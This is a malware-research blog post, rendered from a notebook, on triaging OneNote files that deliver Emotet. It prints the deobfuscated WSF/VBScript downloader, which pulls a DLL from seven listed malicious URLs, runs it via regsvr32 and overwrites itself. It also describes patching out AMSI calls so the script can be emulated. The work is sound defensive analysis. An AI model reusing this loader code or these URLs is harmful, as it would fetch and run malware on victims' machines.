<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="twitter:card" content="summary_large_image" /><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>OneNote WSF Malware (Emotet) | OALABS Research</title>
<meta name="generator" content="Jekyll v4.1.1" />
<meta property="og:title" content="OneNote WSF Malware (Emotet)" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Rapidly extracting IOCs from Onenote malware delivery" />
<meta property="og:description" content="Rapidly extracting IOCs from Onenote malware delivery" />
<link rel="canonical" href="https://research.openanalysis.net/onenote/emotet/wsf/triage/2023/03/19/onenote.html" />
<meta property="og:url" content="https://research.openanalysis.net/onenote/emotet/wsf/triage/2023/03/19/onenote.html" />
<meta property="og:site_name" content="OALABS Research" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-03-19T00:00:00-05:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="OneNote WSF Malware (Emotet)" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-03-19T00:00:00-05:00","datePublished":"2023-03-19T00:00:00-05:00","description":"Rapidly extracting IOCs from Onenote malware delivery","headline":"OneNote WSF Malware (Emotet)","mainEntityOfPage":{"@type":"WebPage","@id":"https://research.openanalysis.net/onenote/emotet/wsf/triage/2023/03/19/onenote.html"},"url":"https://research.openanalysis.net/onenote/emotet/wsf/triage/2023/03/19/onenote.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="https://research.openanalysis.net/feed.xml" title="OALABS Research" /><link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/Primer/15.2.0/primer.css" integrity="sha512-xTz2ys4coGAOz8vuV1NcQBkgVmKhsSEtjbqyMJbBHRplFuvKIUo6xhLHpAyPt9mfR6twHJgn9OgVLuqOvjeBhg==" crossorigin="anonymous" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.14.0/css/all.min.css" integrity="sha512-1PKOgIY59xJ8Co8+NE6FZ+LOAZKjy+KY8iq0G4B3CyeY6wYHN3yt9PW0XpSriVlkMXe40PTKnXrLnZ9+fkDaog==" crossorigin="anonymous" />

<script>
function wrap_img(fn) {
    if (document.attachEvent ? document.readyState === "complete" : document.readyState !== "loading") {
        var elements = document.querySelectorAll(".post img");
        Array.prototype.forEach.call(elements, function(el, i) {
            if (el.getAttribute("title") && (el.className != "emoji")) {
                const caption = document.createElement('figcaption');
                var node = document.createTextNode(el.getAttribute("title"));
                caption.appendChild(node);
                const wrapper = document.createElement('figure');
                wrapper.className = 'image';
                el.parentNode.insertBefore(wrapper, el);
                el.parentNode.removeChild(el);
                wrapper.appendChild(el);
                wrapper.appendChild(caption);
            }
        });
    } else { document.addEventListener('DOMContentLoaded', fn); }
}
window.onload = wrap_img;
</script>

<script>
    document.addEventListener("DOMContentLoaded", function(){
    // add link icon to anchor tags
    var elem = document.querySelectorAll(".anchor-link")
    elem.forEach(e => (e.innerHTML = '<i class="fas fa-link fa-xs"></i>'));
    });
</script>
</head>
<body><header class="site-header">

  <div class="wrapper"><a class="site-title" rel="author" href="/">OALABS Research</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/search/">Search</a><a class="page-link" href="/categories/">Tags</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">OneNote WSF Malware (Emotet)</h1><p class="page-description">Rapidly extracting IOCs from Onenote malware delivery</p><p class="post-meta post-meta-title"><time class="dt-published" datetime="2023-03-19T00:00:00-05:00" itemprop="datePublished">
        Mar 19, 2023
      </time>
       â€¢ <span class="read-time" title="Estimated read time">
    
    
      13 min read
    
</span></p>

    
      <p class="category-tags"><i class="fas fa-tags category-tags-icon"></i></i> 
      
        <a class="category-tags-link" href="/categories/#onenote">onenote</a>
        &nbsp;
      
        <a class="category-tags-link" href="/categories/#emotet">emotet</a>
        &nbsp;
      
        <a class="category-tags-link" href="/categories/#wsf">wsf</a>
        &nbsp;
      
        <a class="category-tags-link" href="/categories/#triage">triage</a>
        
      
      </p>
    

    
      
        <div class="pb-5 d-flex flex-justify-left">
            <div class="px-2">
                <a href="https://www.youtube.com/c/OALabs" role="button" target="_blank">
                    <img class="notebook-badge-image" src="https://img.shields.io/badge/-YouTube-FF0000" alt="Join us on YouTube">
                </a>
            </div>
            <div class="px-2">
                <a href="https://www.twitch.tv/oalabslive" role="button" target="_blank">
                    <img class="notebook-badge-image" src="https://img.shields.io/twitch/status/oalabslive?style=social" alt="Join us on Twitch">
                </a>
            </div>
            <div class="px-2">
                <a href="https://discord.gg/cw4U3WHvpn" role="button" target="_blank">
                    <img class="notebook-badge-image" src="https://img.shields.io/badge/-Join Our Discord-blueviolet" alt="Join Discord">
                </a>
            </div>
            <div class="px-2">
                <a href="https://www.patreon.com/oalabs" role="button" target="_blank">
                    <img class="notebook-badge-image" src="https://img.shields.io/badge/-OALABS Patreon-FF424D" alt="Support us on Patreon">
                </a>
            </div>
          <div class="px-2">

    <a href="https://github.com/OALabs/research/tree/master/_notebooks/2023-03-19-onenote.ipynb" role="button" target="_blank">
<img class="notebook-badge-image" src="/assets/badges/github.svg" alt="View On GitHub">
    </a>
</div>

          
          
          
        </div>
      </header>

  <div class="post-content e-content" itemprop="articleBody">
    <ul id="toc" class="section-nav">
<li class="toc-entry toc-h2"><a href="#Overview">Overview </a></li>
<li class="toc-entry toc-h2"><a href="#Sample">Sample </a></li>
<li class="toc-entry toc-h2"><a href="#References">References </a></li>
<li class="toc-entry toc-h2"><a href="#OneNote-File-Format">OneNote File Format </a></li>
<li class="toc-entry toc-h2"><a href="#Analysis">Analysis </a>
<ul>
<li class="toc-entry toc-h3"><a href="#OneNote-Triage">OneNote Triage </a></li>
</ul>
</li>
<li class="toc-entry toc-h2"><a href="#Emulation?">Emulation? </a>
<ul>
<li class="toc-entry toc-h3"><a href="#Some-Thoughts-on-Emulation">Some Thoughts on Emulation </a></li>
</ul>
</li>
<li class="toc-entry toc-h2"><a href="#Taking-A-Closer-Look-a-The-Scripting-Engine">Taking A Closer Look a The Scripting Engine </a>
<ul>
<li class="toc-entry toc-h3"><a href="#References">References </a></li>
<li class="toc-entry toc-h3"><a href="#Background">Background </a></li>
<li class="toc-entry toc-h3"><a href="#cscript.exe">cscript.exe </a>
<ul>
<li class="toc-entry toc-h4"><a href="#Script-State">Script State </a></li>
</ul>
</li>
<li class="toc-entry toc-h3"><a href="#vbscript.dll">vbscript.dll </a>
<ul>
<li class="toc-entry toc-h4"><a href="#JAmsiProcessor">JAmsiProcessor </a></li>
<li class="toc-entry toc-h4"><a href="#Script-Excution">Script Excution </a></li>
<li class="toc-entry toc-h4"><a href="#Instrumenting-VBscript">Instrumenting VBscript </a></li>
</ul>
</li>
</ul>
</li>
<li class="toc-entry toc-h2"><a href="#Dumpulator-Emulation!">Dumpulator Emulation! </a>
<ul>
<li class="toc-entry toc-h4"><a href="#Dumpulator-(Unicorn)-AVX-Support">Dumpulator (Unicorn) AVX Support </a></li>
<li class="toc-entry toc-h4"><a href="#Syscalls!!">Syscalls!! </a></li>
<li class="toc-entry toc-h4"><a href="#Dumpulator-Alloc-Bug?">Dumpulator Alloc Bug? </a></li>
<li class="toc-entry toc-h4"><a href="#Limitations">Limitations </a></li>
<li class="toc-entry toc-h3"><a href="#Script-Prep">Script Prep </a></li>
<li class="toc-entry toc-h3"><a href="#Dumpulator-Run">Dumpulator Run </a></li>
</ul>
</li>
</ul><!--
#################################################
### THIS FILE WAS AUTOGENERATED! DO NOT EDIT! ###
#################################################
# file to edit: _notebooks/2023-03-19-onenote.ipynb
-->

<div class="container" id="notebook-container">
        
<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h2 id="Overview">
<a class="anchor" href="#Overview" aria-hidden="true"><span class="octicon octicon-link"></span></a>Overview<a class="anchor-link" href="#Overview"> </a>
</h2>
<p>Recently Emotet has been using OneNote files as their pre-binary dropper/downloader. The delivery chain appears to be...</p>
<ul>
<li>OneNote</li>
<li>Embeded WSF file</li>
<li>Download DLL (Emotet first stage)</li>
</ul>
<p>Our goal will be to construct a full static IOC extraction tool for these files!</p>
<p><img src="https://i.imgur.com/QK13VyG.jpg" alt=""></p>
<h2 id="Sample">
<a class="anchor" href="#Sample" aria-hidden="true"><span class="octicon octicon-link"></span></a>Sample<a class="anchor-link" href="#Sample"> </a>
</h2>
<p><code>1c3a7f886a544fc56e91b7232402a1d86282165e2699b7bf36e2b1781cb2adc2</code> <a href="https://bazaar.abuse.ch/sample/1c3a7f886a544fc56e91b7232402a1d86282165e2699b7bf36e2b1781cb2adc2/">Malshare</a></p>
<h2 id="References">
<a class="anchor" href="#References" aria-hidden="true"><span class="octicon octicon-link"></span></a>References<a class="anchor-link" href="#References"> </a>
</h2>
<ul>
<li><a href="https://blog.didierstevens.com/2023/01/22/new-tool-onedump-py/">OneDump python tool from Didier &lt;3 </a></li>
<li><a href="https://github.com/DissectMalware/pyOneNote">pyOneNote python tool</a></li>
<li>OneNote <a href="https://interoperability.blob.core.windows.net/files/MS-ONE/%5bMS-ONE%5d.pdf">ref docs (pdf)</a>
</li>
</ul>
<h2 id="OneNote-File-Format">
<a class="anchor" href="#OneNote-File-Format" aria-hidden="true"><span class="octicon octicon-link"></span></a>OneNote File Format<a class="anchor-link" href="#OneNote-File-Format"> </a>
</h2>
<ul>
<li>OneNote files use the file extension <code>.one</code>
</li>
<li>These documents can contain other files (similar to a .doc file or .xls)<ul>
<li>Not sure if there are limits to the types of files that can be included but <code>.wsf</code> files can be included</li>
</ul>
</li>
<li>The current method used to trick users into executing these embedded files is to place them "under" an image that request the user double click for some reason... the double click will then be passed on to the embedded file. <ul>
<li>Because these files are launched using a "double click" they must have a valid file extension (note for defenders)</li>
</ul>
</li>
</ul>

</div>
</div>
</div>
<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h2 id="Analysis">
<a class="anchor" href="#Analysis" aria-hidden="true"><span class="octicon octicon-link"></span></a>Analysis<a class="anchor-link" href="#Analysis"> </a>
</h2>
<ul>
<li>Extract all embedded files from OneNote document</li>
<li>Search for executable file extensions on extracted files</li>
<li>Triage these files</li>
</ul>
<h3 id="OneNote-Triage">
<a class="anchor" href="#OneNote-Triage" aria-hidden="true"><span class="octicon octicon-link"></span></a>OneNote Triage<a class="anchor-link" href="#OneNote-Triage"> </a>
</h3>
<ul>
<li>inside of onenote is a <code>.wsf</code> file which contains an obfuscated script</li>
<li>replacing the <code>execute</code> command with a simple file print we get the deobfuscated script</li>
</ul>

<pre><code>urlcount=1
set fsobject=createobject("scripting.filesystemobject")
currentdir=fsobject.getparentfoldername(wscript.scriptfullname)
set request=createobject("winhttp.winhttprequest.5.1")
set file=wscript.createobject("shell.application")
set strout=createobject("adodb.stream")
useragent="mozilla/5.0 (windows nt 6.1; wow64; rv:58.0) gecko/20100101 firefox/58.0"
ouch= chr(115-1)+"e"+"gs"&amp;"v"+chr(113+1)+"3"+"2."+chr(101)+"x"+chr(101)+" " + ""
pat3= currentdir+"\"+fsobject.gettempname+".dll"
loiu=ouch+ """"+ pat3 + """"
set triplett=createobject("wscript.shell")
url1 = "https://penshorn.org/admin/Ses8712iGR8du/"
url2 = "https://bbvoyage.com/useragreement/ElKHvb4QIQqSrh6Hqm/"
url3 = "https://www.gomespontes.com.br/logs/pd/"
url4 = "https://portalevolucao.com/GerarBoleto/fLIOoFbFs1jHtX/"
url5 = "http://ozmeydan.com/cekici/9/"
url6 = "http://softwareulike.com/cWIYxWMPkK/"
url7 = "http://wrappixels.com/wp-admin/GdIA2oOQEiO5G/"
do
call dow
loop  while urlcount&lt;8
public function dow()
on error resume next
select case urlcount
case 1
downstr=url1
case 2
downstr=url2
case 3
downstr=url3
case 4
downstr=url4
case 5
downstr=url5
case 6
downstr=url6
case 7
downstr=url7
end select
request.open "get",downstr,false
request.send
If Err.Number&lt;&gt;0 then
urlcount=urlcount+1
else
strout.open
strout.type=1
if vare=0 then
cad=1
else
far=2
end if
strout.write (request.responsebody)
if roum=0 then
sio=sio+1
else
end if
strout.savetofile pat3
strout.close
armour = "samcom."
set fsobject=createobject("scripting.filesystemobject")
Set f = fsobject.GetFile(pat3)
GetFileSize = clng(f.size/1024)
If GetFileSize &gt; 150 Then
call roize
urlcount = 8
else
pat3= currentdir+"\"+fsobject.gettempname+".dll"
loiu=ouch+ """"+ pat3 + """"
urlcount=urlcount+1
end if
end if
end function
public function roize
if derti=0 then
sem=sem+1
else
end if
urlcount = 8
triplett.run (loiu),0,true
cor = "samo"
set fsobject=createobject("scripting.filesystemobject")
set textstream = fsobject.createtextfile(""+wscript.scriptfullname+"")
textstream.write ("badum tss")
if rotate = 12 then
sable = 54 + 22
else
routtt = "carry"
end if
end function</code></pre>

</div>
</div>
</div>
<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h2 id="Emulation?">
<a class="anchor" href="#Emulation?" aria-hidden="true"><span class="octicon octicon-link"></span></a>Emulation?<a class="anchor-link" href="#Emulation?"> </a>
</h2>
<p>Instead of running this live and modifying the script, can we get away with emulating <code>wscript.exe</code> and running the script in an emulator?</p>

</div>
</div>
</div>
<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h3 id="Some-Thoughts-on-Emulation">
<a class="anchor" href="#Some-Thoughts-on-Emulation" aria-hidden="true"><span class="octicon octicon-link"></span></a>Some Thoughts on Emulation<a class="anchor-link" href="#Some-Thoughts-on-Emulation"> </a>
</h3>
<ul>
<li>We want to dump early enough that we can modify the script code before it is parsed </li>
<li>We want to dump late enough that most of the setup is done and we don't have to implement much in dumpulator</li>
<li>Currently we are having some issues with the sweet spot for a dump because wscript -&gt; scobj and scobj uses an abstraction to implement the parser</li>
<li>When we dump before the parser we still have some thread stuff causing issues (maybe not fixable???)</li>
<li>TODO: look into vbscript (without wscript wrapper) is it simpler?? </li>
</ul>

</div>
</div>
</div>
<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h2 id="Taking-A-Closer-Look-a-The-Scripting-Engine">
<a class="anchor" href="#Taking-A-Closer-Look-a-The-Scripting-Engine" aria-hidden="true"><span class="octicon octicon-link"></span></a>Taking A Closer Look a The Scripting Engine<a class="anchor-link" href="#Taking-A-Closer-Look-a-The-Scripting-Engine"> </a>
</h2>
<p>We want a way to run vbs/wsf scripts and dump each deobfuscated script stage (or atleast each stage assuming it will be less obfuscated than the last).</p>
<p>We know that wscript</p>
<h3 id="References">
<a class="anchor" href="#References" aria-hidden="true"><span class="octicon octicon-link"></span></a>References<a class="anchor-link" href="#References"> </a>
</h3>
<ul>
<li><a href="https://github.com/manyfacedllama/amsi-tracer">amsi-trace</a></li>
<li><a href="https://gist.github.com/edygert/95000ba7039992be4dabbe68d10f986c">AMSIScriptContentRetrieval.ps1</a></li>
<li><a href="https://posts.specterops.io/antimalware-scan-interface-detection-optics-analysis-methodology-858c37c38383">Antimalware Scan Interface Detection Optics Analysis Methodology: Identification and Analysis of AMSI for WMI</a></li>
<li><a href="http://www.rohitab.com/apimonitor#Download">API Monitor</a></li>
</ul>
<h3 id="Background">
<a class="anchor" href="#Background" aria-hidden="true"><span class="octicon octicon-link"></span></a>Background<a class="anchor-link" href="#Background"> </a>
</h3>
<ul>
<li>For JScript the solution is much simpler as we can rely on the underlying javascript NODE engine to do the heavy lifting and implement the JScript specific objects/calls <a href="https://github.com/HynekPetrak/malware-jail">malware-jail</a> <a href="https://github.com/mrpapercut/wscript">wscript emulator (jscript only)</a>
</li>
<li>For VBscript there is no good solution as there is no "basic" script engine that we can rely on.</li>
<li>For VBscript we are going to try to doe this dynamically<ul>
<li>Instrument the wscript.exe binary and take a look at what function are used to 'execute' new scripts dynamically </li>
<li>We can also take a look at the AMSI events and see if this is done for us?</li>
</ul>
</li>
</ul>

</div>
</div>
</div>
<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h3 id="cscript.exe">
<a class="anchor" href="#cscript.exe" aria-hidden="true"><span class="octicon octicon-link"></span></a>cscript.exe<a class="anchor-link" href="#cscript.exe"> </a>
</h3>
<p>We are using <code>cscript</code> to launch our test VBS script with the following setup (32bit for ease of debugging).</p>

<pre><code>"C:\Windows\SysWOW64\cscript.exe" c:\users\admin\desktop\test.vbs</code></pre>
<p>We are starting with <code>.vbs</code> instead of <code>.wsf</code> to eliminate any additional complexity (wsf is sent to an XML parser first for the header, etc.)</p>
<h4 id="Script-State">
<a class="anchor" href="#Script-State" aria-hidden="true"><span class="octicon octicon-link"></span></a>Script State<a class="anchor-link" href="#Script-State"> </a>
</h4>
<p>From a high level we can start by breaking on this (callback?) <code>CScriptingEngine::OnStateChange(enum tagSCRIPTSTATE)</code></p>

<pre><code>enum tagSCRIPTSTATE
{
  SCRIPTSTATE_UNINITIALIZED = 0x0,
  SCRIPTSTATE_INITIALIZED = 0x5,
  SCRIPTSTATE_STARTED = 0x1,
  SCRIPTSTATE_CONNECTED = 0x2,
  SCRIPTSTATE_DISCONNECTED = 0x3,
  SCRIPTSTATE_CLOSED = 0x4,
};</code></pre>
<p>This gives us a convenient place to break and investigate the script before it has been passed to the script engine.</p>
<h3 id="vbscript.dll">
<a class="anchor" href="#vbscript.dll" aria-hidden="true"><span class="octicon octicon-link"></span></a>vbscript.dll<a class="anchor-link" href="#vbscript.dll"> </a>
</h3>
<p>Our first focus in the actual scripting engine is the Antimalware Script Interface (AMSI) component which parses the script before it is actually run and sends events to AMSI.</p>
<h4 id="JAmsiProcessor">
<a class="anchor" href="#JAmsiProcessor" aria-hidden="true"><span class="octicon octicon-link"></span></a>JAmsiProcessor<a class="anchor-link" href="#JAmsiProcessor"> </a>
</h4>
<p><code>JAmsi::JAmsiProcessor(struct IDispatch *, long, struct tagDISPPARAMS *, class CSession *)</code></p>
<p>The <code>JAmsiProcessor</code> is actually called for each "execution" of a script (so keywords within a running script will trigger it). The main purpose appears to be to parse the script into command tokens then hash the token (ex. <code>echo</code>) with a version of CRC32 (seed=0xffffffff, inverted result) and then compare the hashes against known values used to trigger AMSI events.</p>
<h4 id="Script-Excution">
<a class="anchor" href="#Script-Excution" aria-hidden="true"><span class="octicon octicon-link"></span></a>Script Excution<a class="anchor-link" href="#Script-Excution"> </a>
</h4>
<p>The following is an example call stack for an executed script.</p>

<pre><code>COleScript::ExecutePendingScripts
CSession::Execute 
CScriptEntryPoint::Call  
CScriptRuntime::Run 
CScriptRuntime::RunNoEH</code></pre>
<p>Following the flow (thank you <a href="https://github.com/oopsmishap">@mishap</a> ...</p>
<blockquote>
<p>VbsExecute-&gt;rtEval and then it recurses back into CScriptEntryPoint::Cal</p>

<pre><code>CSession::Execute       | 
     CScriptEntryPoint::Call |--- Setting up script
     CScriptRuntime::Run     | 
     -------------------------
     CScriptRuntime::RunNoEH |--- Parses over the script
  --&gt;VbsExecute              |--- Hit execute keyword
  |  rtEval                  |--- Evaluates execute args
  |  CScriptEntryPoint::Call |
  |  CScriptRuntime::Run     |--- Recursive call back to parser   
  ---CScriptRuntime::RunNoEH | 
     -------------------------</code></pre>
</blockquote>
<p>Based on this we can break on <code>VbsExecute</code> and observe any scripts that are being executed.</p>
<p><code>struct IEntryPoint *__stdcall VbsExecute(struct VAR *a1, int a2, execute_data *arg_data)</code></p>
<p>We have not fully reversed the structure of the arguments but the following is a start (it is wrong in some cases!!)</p>

<pre><code>struct execute_data
{
  DWORD d0;
  DWORD d1;
  wchar_t *code;
};</code></pre>
<p>** This is the x64dbg log statement we were using for a breakpoint on <code>VbsExecute</code></p>

<pre><code>{utf16@[[esp+0xc] + 8]}</code></pre>

</div>
</div>
</div>
<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h4 id="Instrumenting-VBscript">
<a class="anchor" href="#Instrumenting-VBscript" aria-hidden="true"><span class="octicon octicon-link"></span></a>Instrumenting VBscript<a class="anchor-link" href="#Instrumenting-VBscript"> </a>
</h4>
<p>Also thanks to <a href="https://github.com/oopsmishap">@mishap</a> we dug further and discovered that <code>rtEval</code> is called with the contents of the script to be executed so we can break on this instead and pull the script (wide string) from ECX (fastcall).</p>

<pre><code>struct IEntryPoint *__fastcall rtEval(unsigned __int16 *a1, struct IEntryPoint *a2, int a3, int a4)</code></pre>
<p>The following is all we need in x64dbg to log all executed scripts with a breakpoint on this function <code>{utf16@ecx}</code></p>

</div>
</div>
</div>
<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h2 id="Dumpulator-Emulation!">
<a class="anchor" href="#Dumpulator-Emulation!" aria-hidden="true"><span class="octicon octicon-link"></span></a>Dumpulator Emulation!<a class="anchor-link" href="#Dumpulator-Emulation!"> </a>
</h2>
</div>
</div>
</div>
<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<p>Now that we have a better place to dump we can try this again.</p>
<ul>
<li>Run a test script that includes <code>execute</code> until a bp on <code>rtEval</code> is hit</li>
<li>Dump </li>
<li>Load in Dumpulator</li>
<li>ECX contains a pointer to the script (wide string)</li>
<li>Place Dumpulator bp on <code>rtEval</code> </li>
<li>Replace this script with the target script in dumpulator and run</li>
<li>When the Dumpulotor <code>rtEval</code> bp is hit it means that another script is attempting to execute (pointed to by ECX)</li>
</ul>
<p>We still ran into a few issues but managed to work passed them...</p>
<h4 id="Dumpulator-(Unicorn)-AVX-Support">
<a class="anchor" href="#Dumpulator-(Unicorn)-AVX-Support" aria-hidden="true"><span class="octicon octicon-link"></span></a>Dumpulator (Unicorn) AVX Support<a class="anchor-link" href="#Dumpulator-(Unicorn)-AVX-Support"> </a>
</h4>
<p>There is no support for AVX in Unicorn so we had to use a VM with  AVX instructions disabled to take our dump for Dumpulator.</p>
<h4 id="Syscalls!!">
<a class="anchor" href="#Syscalls!!" aria-hidden="true"><span class="octicon octicon-link"></span></a>Syscalls!!<a class="anchor-link" href="#Syscalls!!"> </a>
</h4>
<p>Inside of the <code>rtEval</code> function the AMSI functions are called which in turn call into the Defender DLL. This causes all kinds of Syscall activity that we don't want to implement in Dumpulator so our solution was to just NOP out the AMSI calls. (Image and implementation courtesy of <a href="https://github.com/oopsmishap">@mishap</a>)</p>
<p><img src="https://i.imgur.com/Sd7rrFH.png" alt=""></p>
<h4 id="Dumpulator-Alloc-Bug?">
<a class="anchor" href="#Dumpulator-Alloc-Bug?" aria-hidden="true"><span class="octicon octicon-link"></span></a>Dumpulator Alloc Bug?<a class="anchor-link" href="#Dumpulator-Alloc-Bug?"> </a>
</h4>
<p>There was some sort of issue with page alignment in dumpulator's memory manager so we just forced it in <code>ZwAllocateVirtualMemory</code>.</p>

<pre><code>base = round_to_pages(base)</code></pre>
<p>This will be opened as as a proper issue...</p>
<h4 id="Limitations">
<a class="anchor" href="#Limitations" aria-hidden="true"><span class="octicon octicon-link"></span></a>Limitations<a class="anchor-link" href="#Limitations"> </a>
</h4>
<p>This is just a <strong>proof of concept</strong>.</p>
<ul>
<li>We only handle the <code>execute</code> method from VBS other execution methods may need additional hooks</li>
<li>We also don't handle any actual script execution (ie. calls to Windows APIs from the script)</li>
<li>We only deobfuscate the first layer then end </li>
<li>Currently we don't exit cleanly at the end of the script (it runs till failure) </li>
</ul>

</div>
</div>
</div>
<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h3 id="Script-Prep">
<a class="anchor" href="#Script-Prep" aria-hidden="true"><span class="octicon octicon-link"></span></a>Script Prep<a class="anchor-link" href="#Script-Prep"> </a>
</h3>
<p>Because we are effectively treating our target script as through it was a script passed to the <code>execute</code> command as a string it must be encoded as UTF-16 and it cannot contain any comments.</p>

</div>
</div>
</div>
    
    
<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="n">script</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'/tmp/bad.vbs'</span><span class="p">,</span><span class="s1">'rb'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<span class="n">out</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">''</span>
<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">script</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">c</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="sa">b</span><span class="s2">"'"</span><span class="p">):</span>
        <span class="k">continue</span>
    <span class="n">out</span> <span class="o">+=</span> <span class="n">c</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span>

<span class="n">tmp_bytes</span> <span class="o">=</span> <span class="p">[]</span> 

<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">out</span><span class="p">:</span>
    <span class="n">tmp_bytes</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
    <span class="n">tmp_bytes</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">script_bytes</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">tmp_bytes</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x00\x00</span><span class="s1">'</span>
</pre></div>

    </div>
</div>
</div>

</div>
    

<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h3 id="Dumpulator-Run">
<a class="anchor" href="#Dumpulator-Run" aria-hidden="true"><span class="octicon octicon-link"></span></a>Dumpulator Run<a class="anchor-link" href="#Dumpulator-Run"> </a>
</h3>
</div>
</div>
</div>
    
    
<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="kn">from</span> <span class="nn">dataclasses</span> <span class="kn">import</span> <span class="n">dataclass</span>
<span class="kn">from</span> <span class="nn">typing</span> <span class="kn">import</span> <span class="n">Callable</span><span class="p">,</span> <span class="n">Dict</span><span class="p">,</span> <span class="n">Union</span><span class="p">,</span> <span class="n">Optional</span>

<span class="kn">from</span> <span class="nn">dumpulator</span> <span class="kn">import</span> <span class="n">Dumpulator</span>
<span class="kn">from</span> <span class="nn">dumpulator.dumpulator</span> <span class="kn">import</span> <span class="n">ExceptionInfo</span><span class="p">,</span> <span class="n">ExceptionType</span>

<span class="n">seen</span> <span class="o">=</span> <span class="kc">False</span>

<span class="nd">@dataclass</span>
<span class="k">class</span> <span class="nc">BreakpointInfo</span><span class="p">:</span>
    <span class="n">address</span><span class="p">:</span> <span class="nb">int</span>
    <span class="n">original</span><span class="p">:</span> <span class="nb">bytes</span>
    <span class="n">callback</span><span class="p">:</span> <span class="n">Callable</span><span class="p">[[],</span> <span class="kc">None</span><span class="p">]</span>

<span class="k">class</span> <span class="nc">MyDumpulator</span><span class="p">(</span><span class="n">Dumpulator</span><span class="p">):</span>
    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
        <span class="nb">super</span><span class="p">()</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">_breakpoints</span><span class="p">:</span> <span class="n">Dict</span><span class="p">[</span><span class="nb">int</span><span class="p">,</span> <span class="n">BreakpointInfo</span><span class="p">]</span> <span class="o">=</span> <span class="p">{}</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">_breakpoint_step</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="n">BreakpointInfo</span><span class="p">]</span> <span class="o">=</span> <span class="kc">None</span>
